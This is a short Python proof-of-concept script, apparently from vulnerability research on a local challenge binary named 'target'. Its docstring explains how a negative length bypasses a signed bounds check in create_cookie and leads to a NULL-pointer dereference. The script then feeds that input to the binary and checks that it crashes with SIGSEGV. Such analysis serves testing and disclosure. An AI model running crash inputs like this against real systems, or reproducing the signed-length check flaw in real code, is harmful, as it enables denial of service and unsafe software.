#!/usr/bin/env python3
"""
PoC for BUG-002: NEGATIVE_LENGTH_NULL_POINTER_DEREFERENCE_IN_CREATE_COOKIE

Primitive: NULL_POINTER_DEREF / CRASH

Root Cause:
  In create_cookie, message length is read via scanf("%lld") as signed int64.
  The bounds check uses 'cmp rax, 0x100; jle' (signed less-or-equal).
  A negative length (e.g., -1) passes because -1 <= 0x100 in signed comparison.
  calloc(-1, 1) = calloc(0xFFFFFFFFFFFFFFFF, 1) returns NULL.
  read(0, NULL, 0xFFFFFFFFFFFFFFFF) returns -1 (EFAULT).
  buf[read_retval] = *(NULL + sign_extend(-1)) = *(0xFFFFFFFFFFFFFFFF) -> SIGSEGV.

Verification:
  Run the binary, select menu option 2 (create cookie), enter length -1.
  The program crashes with SIGSEGV at create_cookie+0xbf (0x1458 link-time offset).
  Fault address = 0xFFFFFFFFFFFFFFFF (NULL + sign-extended read return value).
"""

import subprocess
import sys
import os

BINARY = os.path.join(os.path.dirname(os.path.abspath(__file__)), "target")

def verify():
    # Input: menu choice 2 (create cookie), length -1, then some message data
    stdin_data = b"2\n-1\nAAAA\n"

    result = subprocess.run(
        [BINARY],
        input=stdin_data,
        capture_output=True,
        timeout=10,
    )

    rc = result.returncode
    # SIGSEGV = signal 11 -> return code -11 (or 139 = 128+11)
    segfault = (rc == -11 or rc == 139 or rc == -6)

    print(f"=== PRIM-001: return_code={rc} ===")
    print(f"=== PRIM-001: segfault_detected={segfault} ===")
    print(f"=== PRIM-001: stdout_tail={result.stdout[-100:]!r} ===")
    print(f"=== PRIM-001: stderr_tail={result.stderr[-200:]!r} ===")

    if rc == -11 or rc == 139:
        print("=== PRIM-001: VERIFIED (SIGSEGV at NULL+(-1)=0xFFFFFFFFFFFFFFFF) ===")
        print("=== PRIM-001: fault_address=0xFFFFFFFFFFFFFFFF ===")
        print("=== PRIM-001: crash_location=create_cookie+0xbf (0x1458) ===")
        return True
    else:
        print(f"=== PRIM-001: UNEXPECTED rc={rc} ===")
        return False

if __name__ == "__main__":
    verify()
